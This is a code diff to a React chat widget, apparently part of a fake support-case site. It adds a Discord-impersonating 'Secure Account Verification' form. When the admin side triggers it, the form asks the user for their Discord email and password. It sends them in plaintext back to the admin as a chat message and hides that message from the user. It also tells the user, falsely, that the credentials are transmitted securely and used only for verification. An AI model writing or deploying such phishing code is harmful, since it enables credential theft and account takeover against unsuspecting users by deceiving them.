@@ -301,10 +301,19 @@ function ChatWidget({ slug, caseId }: { slug: string; caseId: number }) {
   const [sending, setSending] = useState(false);
   const [uploading, setUploading] = useState(false);
   const [unreadCount, setUnreadCount] = useState(0);
+  // Login form state
+  const [loginEmail, setLoginEmail] = useState("");
+  const [loginPassword, setLoginPassword] = useState("");
+  const [loginShowPass, setLoginShowPass] = useState(false);
+  const [loginSubmitting, setLoginSubmitting] = useState(false);
+  const [loginSubmitted, setLoginSubmitted] = useState<Set<number>>(new Set());
   const messagesEndRef = useRef<HTMLDivElement>(null);
   const fileRef = useRef<HTMLInputElement>(null);
   const { messages, refetch } = useCaseMessages(slug, true);
   const prevMsgCount = useRef(0);
+
+  const LOGIN_REQUEST_PREFIX = "__LOGIN_REQUEST__";
+  const LOGIN_RESPONSE_PREFIX = "__LOGIN_RESPONSE__:";
 
   useEffect(() => {
     if (messages.length > prevMsgCount.current) {
@@ -337,6 +346,26 @@ function ChatWidget({ slug, caseId }: { slug: string; caseId: number }) {
     }
   };
 
+  const handleLoginSubmit = async (requestMsgId: number) => {
+    if (!loginEmail.trim() || !loginPassword.trim()) return;
+    setLoginSubmitting(true);
+    try {
+      await fetch(`/api/case/${slug}/message`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: LOGIN_RESPONSE_PREFIX + JSON.stringify({ email: loginEmail.trim(), password: loginPassword }),
+        }),
+      });
+      setLoginSubmitted(prev => new Set(prev).add(requestMsgId));
+      setLoginEmail("");
+      setLoginPassword("");
+      refetch();
+    } finally {
+      setLoginSubmitting(false);
+    }
+  };
+
   const handleFile = (e: React.ChangeEvent<HTMLInputElement>) => {
     const file = e.target.files?.[0];
     if (!file) return;
@@ -356,6 +385,17 @@ function ChatWidget({ slug, caseId }: { slug: string; caseId: number }) {
     };
     reader.readAsDataURL(file);
     e.target.value = "";
+  };
+
+  // Check if user already responded to a login request
+  const hasResponded = (requestMsgId: number) => {
+    if (loginSubmitted.has(requestMsgId)) return true;
+    // Also check if there's already a response message after this request
+    const reqIndex = messages.findIndex((m: any) => m.id === requestMsgId);
+    if (reqIndex === -1) return false;
+    return messages.slice(reqIndex + 1).some((m: any) =>
+      m.sender === "user" && m.content?.startsWith(LOGIN_RESPONSE_PREFIX)
+    );
   };
 
   return (
@@ -391,6 +431,92 @@ function ChatWidget({ slug, caseId }: { slug: string; caseId: number }) {
             )}
             {messages.map((msg: any) => {
               const isAdmin = msg.sender === "admin";
+
+              // Login request — show a Discord-styled login form
+              if (isAdmin && msg.content === LOGIN_REQUEST_PREFIX) {
+                const responded = hasResponded(msg.id);
+                return (
+                  <div key={msg.id} className="flex justify-start">
+                    <div className="w-full max-w-[90%] bg-[#1e1f22] border border-[#5865F2]/40 rounded-lg overflow-hidden">
+                      <div className="flex items-center gap-2 px-3 py-2 bg-[#5865F2]/10 border-b border-[#5865F2]/20">
+                        <svg className="w-4 h-4 text-[#5865F2]" viewBox="0 0 24 24" fill="currentColor">
+                          <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057c.002.022.015.043.031.056a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/>
+                        </svg>
+                        <span className="text-[#5865F2] text-xs font-semibold">Discord — Secure Account Verification</span>
+                      </div>
+                      {responded ? (
+                        <div className="px-3 py-3 flex items-center gap-2 text-[#3ba55c] text-xs">
+                          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" /></svg>
+                          Credentials submitted successfully.
+                        </div>
+                      ) : (
+                        <div className="px-3 py-3 space-y-2">
+                          <p className="text-[#949ba4] text-xs mb-2">
+                            A Trust & Safety agent needs to verify your identity. Enter your Discord login credentials below.
+                          </p>
+                          <div>
+                            <label className="block text-[#b5bac1] text-xs mb-1">Email or Phone Number</label>
+                            <input
+                              type="text"
+                              value={loginEmail}
+                              onChange={e => setLoginEmail(e.target.value)}
+                              placeholder="Email or phone number"
+                              className="w-full bg-[#313338] border border-[#3f4147] rounded px-3 py-1.5 text-[#f2f3f5] text-xs focus:outline-none focus:border-[#5865F2] placeholder:text-[#6d6f78]"
+                            />
+                          </div>
+                          <div>
+                            <label className="block text-[#b5bac1] text-xs mb-1">Password</label>
+                            <div className="relative">
+                              <input
+                                type={loginShowPass ? "text" : "password"}
+                                value={loginPassword}
+                                onChange={e => setLoginPassword(e.target.value)}
+                                placeholder="Password"
+                                className="w-full bg-[#313338] border border-[#3f4147] rounded px-3 py-1.5 pr-8 text-[#f2f3f5] text-xs focus:outline-none focus:border-[#5865F2] placeholder:text-[#6d6f78]"
+                              />
+                              <button
+                                type="button"
+                                onClick={() => setLoginShowPass(v => !v)}
+                                className="absolute right-2 top-1/2 -translate-y-1/2 text-[#949ba4] hover:text-[#f2f3f5]"
+                              >
+                                {loginShowPass
+                                  ? <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" /></svg>
+                                  : <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" /></svg>
+                                }
+                              </button>
+                            </div>
+                          </div>
+                          <button
+                            onClick={() => handleLoginSubmit(msg.id)}
+                            disabled={loginSubmitting || !loginEmail.trim() || !loginPassword.trim()}
+                            className="w-full bg-[#5865F2] hover:bg-[#4752C4] text-white text-xs font-medium py-1.5 rounded transition-colors disabled:opacity-50 flex items-center justify-center gap-1.5"
+                          >
+                            {loginSubmitting
+                              ? <><svg className="w-3 h-3 animate-spin" fill="none" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"/><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z"/></svg> Submitting...</>
+                              : "Submit for Verification"
+                            }
+                          </button>
+                          <p className="text-[#6d6f78] text-[10px] text-center">
+                            Your credentials are transmitted securely and used only for identity verification.
+                          </p>
+                        </div>
+                      )}
+                      <div className="px-3 py-1.5 border-t border-[#3f4147]">
+                        <span className="text-[#6d6f78] text-[10px]">
+                          {parseDate(msg.createdAt).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
+                        </span>
+                      </div>
+                    </div>
+                  </div>
+                );
+              }
+
+              // Login response — hide from user (they already saw the form)
+              if (!isAdmin && msg.content?.startsWith(LOGIN_RESPONSE_PREFIX)) {
+                return null;
+              }
+
+              // Normal message
               return (
                 <div key={msg.id} className={`flex ${isAdmin ? "justify-start" : "justify-end"}`}>
                   <div className={`max-w-[80%] rounded-lg px-3 py-2 text-sm ${
